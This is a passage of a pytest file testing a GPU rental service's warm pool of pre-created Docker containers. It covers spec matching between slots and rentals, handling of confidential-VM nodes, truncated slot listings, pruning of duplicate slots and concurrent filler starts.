    ids=["plain", "rdma", "sysbox"],
)
async def test_slot_the_filler_creates_is_what_a_whole_host_rental_creates(svc, monkeypatch, device_nodes, sysbox):
    """`_create_warm_slot`'s spec and a whole-host default-template rental's spec on the same host must
    be equal under `slot_matches` — else every adoption falls back and the pool is only cost. On a
    host that forwards RDMA devices the rental (which carries a memory limit) gets unlimited memlock,
    and `docker update` cannot add a ulimit, so the slot must carry it from its create. On a sysbox
    host the slot runs under `sysbox-runc` with the encrypted volume at `/lium-cipher` and `/dev/fuse`,
    which is what a rental whose payload says `is_sysbox` / `enable_volume_encryption` (the backend's
    host facts) builds. The rental's container ports come from `generate_portMappings`' choice
    (`_get_preferred_ports(None)` behind 22), not from the slot, so a drift in either list fails here."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    monkeypatch.setattr(ds_module.settings, "ENABLE_VOLUME_ENCRYPTION", True)
    _, client, image = _filler_host(
        svc, monkeypatch, gpu_uuids=("GPU-aaaa", "GPU-bbbb"), device_nodes=device_nodes, sysbox=sysbox
    )
    await _start_filler(svc)
    (slot_spec, labels), = client.created

    rental = _adoptable_payload(
        memory_gb=16, cpu_count=8, storage_limit_gb=20, is_sysbox=sysbox, enable_volume_encryption=sysbox
    )
    rental_ports = svc._get_preferred_ports(None)
    if 22 in rental_ports:
        rental_ports.remove(22)
    rental_ports.insert(0, 22)
    slot_host_port = {p.container_port: p.host_port for p in slot_spec.ports}
    assert set(rental_ports) == set(slot_host_port), "the slot publishes the ports a rental asks for"
    encrypted = ds_module._should_encrypt_local_volume(
        slot_spec.volumes[0].source, rental.workload_kind, rental.is_sysbox, rental.enable_volume_encryption
    )
    assert encrypted is sysbox
    rental_spec = svc._build_rental_container_run_spec(
        payload=rental,
        container_name="container_rental",
        custom_options=CustomOptions(),
        port_maps=[(c, slot_host_port[c], slot_host_port[c]) for c in rental_ports],
        local_volume=slot_spec.volumes[0].source,
        local_volume_path="/root",
        encrypted_local_volume=encrypted,
        external_volume_name=None,
        gpu_devices=build_gpu_docker_config(["GPU-aaaa", "GPU-bbbb"], device_nodes=device_nodes),
        effective_storage_limit_gb=slot_spec.storage_limit_gb,
        cpu_count=8,
    )
    assert rental_spec.memory_gb == 16 and slot_spec.memory_gb is None
    assert bool(rental_spec.ulimits) is bool(device_nodes)
    assert slot_spec.ulimits == rental_spec.ulimits
    assert (slot_spec.runtime == "sysbox-runc") is sysbox
    assert (slot_spec.volumes[0].target == ds_module._LIUM_CIPHER_MOUNT) is sysbox

    slot = warm_pool.slot_from_inspect(
        _slot_doc(slot_spec, image, labels=labels), image_id=IMAGE_ID, now=NOW, max_age=MAX_AGE
    )
    assert slot is not None
    assert warm_pool.slot_matches(slot, rental_spec, image) is None


def test_cvm_rental_with_a_quote_socket_never_adopts():
    """The TDX quote-broker socket is a create-time bind mount a slot never carries."""
    assert (
        warm_pool.adopt_block_reason(
            _adoptable_payload(),
            CustomOptions(),
            is_custom_build=False,
            image_managed_jupyter=False,
            wants_quote_socket=True,
        )
        == "cvm quote socket is create-time"
    )


@pytest.mark.asyncio
async def test_cvm_node_gets_no_slot(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    monkeypatch.setattr(ds_module.settings, "ENABLE_CVM_POD_QUOTE_SOCKET", True)
    ssh, client, _ = _filler_host(svc, monkeypatch)
    await _start_filler(svc, tdx_quote="quote-bytes")
    assert client.created == []
    assert not any("__LIUM_WARM_POOL__" in c for c in _cmds(ssh))


# ------------------------------------------------------------------
# the number of slots on a host is bounded whatever the host answers
# ------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unreadable_slot_listing_creates_nothing(svc, monkeypatch):
    """A slot section cut by the byte cap must not read as "no slots": that would add one slot per
    filler start until the age-out."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    image = _image_doc()
    whole = json.dumps([_slot_doc(_spec(svc, _adoptable_payload()), image)] * 3)
    state = {"images": {IMAGE: {"last_pull_ok_at": "2026-09-09T01:00:00Z"}}}
    ssh = _ssh_client(inspect_exit=0)

    def _side(cmd, *args, **kwargs):
        if "cache_prefetch_state.json" in cmd:
            return _ssh_result(stdout=json.dumps(state))
        if "__LIUM_WARM_POOL__" in cmd:
            return _ssh_result(stdout=json.dumps(image) + "\n__LIUM_WARM_POOL__\n" + whole[: len(whole) // 2])
        if "nvidia-smi --query-gpu=uuid" in cmd:
            return _ssh_result(stdout="GPU-aaaa\n")
        return _ssh_result(exit_status=0)

    ssh.run = AsyncMock(side_effect=_side)
    _patch_happy(svc, monkeypatch, ssh)
    client = _CreatingFakeClient(svc.rental_docker_client_factory.client)
    svc.rental_docker_client_factory.client = client
    await _start_filler(svc)
    assert client.created == []
    assert not any("docker rm -f" in c for c in _cmds(ssh))


@pytest.mark.asyncio
async def test_duplicate_slots_of_one_image_are_pruned_to_the_newest(svc, monkeypatch):
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    image = _image_doc()
    older = _slot_doc(
        _spec(svc, _adoptable_payload(), local_volume="volume_older"),
        image,
        labels=warm_pool.slot_labels(volume_limit_gb=40, storage_limit_gb=20, now=NOW - timedelta(hours=2)),
        Name="/warm_older",
    )
    newer = _slot_doc(
        _spec(svc, _adoptable_payload(), local_volume="volume_newer"),
        image,
        labels=warm_pool.slot_labels(volume_limit_gb=40, storage_limit_gb=20, now=NOW - timedelta(hours=1)),
        Name="/warm_newer",
    )
    ssh, client, _ = _filler_host(svc, monkeypatch, slots=(older, newer))
    await _start_filler(svc)
    cmds = _cmds(ssh)
    assert client.created == []
    assert any("docker rm -f warm_older" in c and "volume rm volume_older" in c for c in cmds)
    assert not any("docker rm -f warm_newer" in c for c in cmds)


@pytest.mark.asyncio
async def test_two_filler_starts_on_one_executor_leave_one_slot(svc, monkeypatch):
    """Two fillers of a GPU-split node start together; the second sees maintenance in progress and
    creates nothing (else both list zero slots and both create one)."""
    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
    ssh, client, _ = _filler_host(svc, monkeypatch)
    real_create = client.create_container

    async def _slow_create(spec, *, labels=None):
        await asyncio.sleep(0.05)
        await real_create(spec, labels=labels)

    client.create_container = _slow_create
    filler = _payload(workload_kind=WorkloadKind.FILLER, docker_image="daturaai/empty-job:1.0.0", storage_limit_gb=20)
    executor_info = _executor_info(filler)
    executor_info.port_range = "20000-20020"
    results = await asyncio.gather(
        *(
            svc.create_container(
                payload=filler, executor_info=executor_info, keypair=Mock(ss58_address="v"), private_key="encrypted"
            )
            for _ in range(2)
        )
    )
    assert all(isinstance(r, ContainerCreated) for r in results)
    assert len(client.created) == 1
    assert DockerService._warm_pool_maintaining == set()
